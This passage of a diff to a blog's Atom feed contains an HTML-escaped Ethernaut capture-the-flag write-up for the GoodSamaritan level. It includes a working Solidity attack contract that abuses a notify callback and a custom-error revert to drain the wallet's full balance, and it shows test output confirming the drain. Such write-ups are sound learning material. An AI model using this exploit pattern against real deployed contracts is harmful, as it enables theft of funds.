+  &lt;li&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Wallet&lt;/code&gt; contract, notice that when the balance is &amp;lt; 10, we &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revert NotEnoughBalance()&lt;/code&gt;, which is caught in the try-catch within &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;requestDonation()&lt;/code&gt; triggering &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wallet.transferRemainder(msg.sender)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Ideally, we would like to return the same &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revert NotEnoughBalance()&lt;/code&gt; error even when the balance is 1 million.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;donate10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onlyOwner&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// check balance left
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;balances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;revert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NotEnoughBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;c1&quot;&gt;// donate 10 coins
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;coin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Thankfully, we see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Coin&lt;/code&gt; contract’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;transfer&lt;/code&gt; function has an exploitable feature (if the destination &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_dest.isContract()&lt;/code&gt; is true): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;INotifyable(dest_).notify(amount_)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//Coin&apos;s transfer function
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;transfer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dest_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentBalance&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;balances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;c1&quot;&gt;// transfer only occurs if balance is enough
+&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;currentBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;balances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;balances&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;isContract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;c1&quot;&gt;// notify contract (EXPLOIT HERE!!)
+&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;INotifyable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dest_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amount_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;revert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InsufficientBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;currentBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;amount_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All we need to do is deploy a malicious contract implementing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notify(amount)&lt;/code&gt; which simply reverts as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revert NotEnoughBalance()&lt;/code&gt;. However, we have to be careful with one detail: it must only revert when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;amount&lt;/code&gt; parameters is 10 (or less). See below for code.&lt;/p&gt;
+
+&lt;p&gt;This is so that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wallet.donate10(msg.sender)&lt;/code&gt; will get reverted on the try statement (since amount=10), but on the catch statement, the call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wallet.transferRemainder(msg.sender)&lt;/code&gt; should be allowed to go through, which ends up executing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;coin.transfer(attacker, amount=1000000)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;contract&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AttackGoodSamaritan&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;INotifyable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NotEnoughBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;constructor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;IGoodSamaritan&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IGoodSamaritan&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;requestDonation&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_amount&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;pure&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;        
+        &lt;span class=&quot;c1&quot;&gt;//revert on wallet.donate10(msg.sender), ie. amount=10
+&lt;/span&gt;        &lt;span class=&quot;c1&quot;&gt;//but don&apos;t revert on wallet.transferRemainder(msg.sender), ie. amount=1000000
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_amount&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nb&quot;&gt;revert&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NotEnoughBalance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;        
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Indeed, in the foundry Test script logging we see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;coin.balances(&amp;lt;attacker_address&amp;gt;)&lt;/code&gt; goes from 0 to 1 million after calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attack()&lt;/code&gt;.&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+      
+
+      
+        <summary type="html">This is the second half of the Ethernaut series notes on how I solved each level using Foundry. For the first half, please see the previous post. The contracts deployed to solve the challenges, as well as test scripts, can be found on my Github.</summary>
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
